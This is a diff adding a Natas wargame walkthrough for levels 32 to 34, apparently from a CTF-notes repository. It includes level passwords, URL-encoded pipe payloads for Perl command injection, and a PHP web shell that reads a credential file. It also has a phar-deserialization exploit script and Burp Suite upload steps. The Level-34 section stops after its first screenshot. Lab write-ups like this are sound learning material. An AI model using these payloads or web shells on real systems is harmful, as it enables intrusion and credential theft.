@@ -1283,6 +1283,169 @@
 
 
 
+## Level-32
+- Username : natas32
+- Password : NaIWhW2VIrKqrc7aroJVHOZvk3RQMI0B
+- Domain : http://natas32.natas.labs.overthewire.org
+## Explanation
+- Step 1: Go to Firefox Browser, Then Connect to natas32.natas.labs.overthewire.org, Then login with username and password
+- Step 2: Then click view source code, it's a perl script
+- Step 3: we have to exicute multiple commands , 1.find out the file , 2.then exicute we can use Repeater
+
+-  Step 4: Go to Burpsuite switch on the intercept on (Receive)
+
+- Step 5: First set up firefox proxy on Burp suite, Browse a file, then upload it, It will navigate to burpsuite, Then click send to Repeater, Then click on Repeater, it has placed in menus bar
+- Step 6: Then click on Repeater, it has placed in menus bar, it has we will see Hi it will what we have uploaded, look like this
+
+<img width="746" height="635" alt="image" src="https://github.com/user-attachments/assets/b448bddb-669d-459f-b541-b17255055c20" />
+
+- Step 7: Then change that properties, and We need to find files that are present in the directory
+
+      ARGV Exicutable command,  use post function arguments in post ?  arguments become commands 
+     
+      some special charects can not put in url, So we can go through this type url 
+     
+                   ?ls . |
+                 
+      space encoded %20 , pipe line | encoded as %7C , C is captal letter 
+                 
+                 ?ls%20.%20%7C
+
+  - Step 8: After change that properties, Click Send button, it will look like this
+ 
+    <img width="1012" height="593" alt="image" src="https://github.com/user-attachments/assets/34cf6586-28c7-4342-97ae-1dc6bd80abaa" />
+
+  - Step 9: We found get password , Then we will exicute that get password file
+ 
+            ?./getpassword |
+
+        ?./getpassword%20%7C
+
+  - Step 10: After using get password file, Then click Send button, we will get the password for Natas33
+ 
+    <img width="1007" height="640" alt="image" src="https://github.com/user-attachments/assets/1ee688e9-a0db-4c97-9b1d-3961fadc22c9" />
+
+
+
+ ## Level-33
+- Username : natas33
+- Password : 2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ
+- Domain : http://natas33.natas.labs.overthewire.org
+## Explanation
+- Step 1: Go to Firefox Browser, Then Connect to natas33.natas.labs.overthewire.org, Then login with username and password
+
+- Step 2: Then click view source code, it's a php script
+- Step 3: we need create file, shell.php
+- Step 4: So, we will Write a code like this, In nano editor, Then save the file, Then . Whole process in kali Linux. Because of it has librabraries.
+
+      <?php 
+      echo shell_exec('cat /etc/natas_webpass/natas34');
+      ?>
+
+- Step 6: we need create file, natas33.php,
+
+        <?php
+      class Executor
+      {
+         private $filename = "shell.php";
+         private $signature = True;
+         private $init = False;
+      }
+       $phar = new Phar('natas.phar');
+       $phar->startBuffering();
+       $phar->addFromstring('test.txt', 'test');
+       $phar->setStub('<?php __HALT_COMPILER(); ?>');
+      
+      $object = new Executor();
+      $object ->data = 'rips';
+      $phar ->setMetadata($object);
+      $phar->stopBuffering();
+      
+      ?>
+
+- Step 7: Then Run this commnand in kali Linux, After this it automatically creates natas.phar file
+
+- php -d phar.readonly=false natas33.php
+
+  <img width="1303" height="360" alt="image" src="https://github.com/user-attachments/assets/b8fd6c48-fc4a-4a2e-9c10-2e80a6808fa8" />
+
+- Step 8: We want to see contents of the natas.phar file , it will look like this
+
+- Step 9: Then switch on the intercept on (Receive)
+
+- Step 10: First set up firefox proxy on Burp suite, Browse a shell.php file, then upload it, It will navigate to burpsuite, Then click send to Repeater, Then click on Repeater, it has placed in menus bar
+
+  <img width="1012" height="640" alt="image" src="https://github.com/user-attachments/assets/7bc83b61-60ba-4090-8e60-d9f385ed6c97" />
+  
+- Step 11: Then changes that property to shell.php, Then click send button
+
+  <img width="752" height="697" alt="image" src="https://github.com/user-attachments/assets/a5ca9e19-2ba0-4d6e-8bd6-ddf755ded384" />
+
+  <img width="1011" height="561" alt="image" src="https://github.com/user-attachments/assets/8f062c35-5059-4be5-ac41-d687d46415cd" />
+
+- Step 12: Disable browser burpsuite proxy, Then again Browse a natas.phar file, then upload it, Then click send Repeater, Then click on Repeater,
+
+<img width="1007" height="698" alt="image" src="https://github.com/user-attachments/assets/bca3569e-d4fb-416e-b5b6-1e6110cc26ea" />
+
+- Step 13: Then changes that propertiy to natas.phar, Then click send button
+
+<img width="753" height="702" alt="image" src="https://github.com/user-attachments/assets/5809e061-42ea-40df-98cd-ff6aa46f743d" />
+
+
+<img width="1013" height="561" alt="image" src="https://github.com/user-attachments/assets/6c4d8559-70ef-44a3-9a23-89850fee1919" />
+
+- Step 14: Go to http history, Then click what you click previously natas.phar file, Then click send Repeater, Then click on Repeater
+
+<img width="737" height="693" alt="image" src="https://github.com/user-attachments/assets/f8d3c00b-4e35-4d72-aa2f-673bc482187f" /><img width="498" height="498" alt="CongratulationsWellDoneSimonCowellGIF" src="https://github.com/user-attachments/assets/39255939-4967-4915-a05c-cd9599017d8c" />
+
+
+
+- Step 15: Then changes that propertiy to phar://natas.phar/test.txt, Then click send button
+
+- Step 16: Then you will see the password for level-34
+
+  <img width="1006" height="592" alt="image" src="https://github.com/user-attachments/assets/036c4b7e-463c-4445-a2a3-056670e661b5" />
+
+
+  ## Level-34
+  - Username : natas34
+  - Password : j4O7Q7Q5er5XFRCepmyXJaWCSIrslCJY
+  - Domain : http://natas34.natas.labs.overthewire.org
+## Explanation
+- step 1: Go to Firefox Browser, Then Connect to natas34.natas.labs.overthewire.org, Then login with username and password
+
+- step 2: You will see the page like this
+
+  <img width="1910" height="352" alt="image" src="https://github.com/user-attachments/assets/29c78916-190a-4c9b-9ff9-d7757268b78d" />
+
+
+<img width="498" height="498" alt="IWasntFinishedCharleyGIF" src="https://github.com/user-attachments/assets/4a7da72e-687a-4771-8be6-f7db236acaa7" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
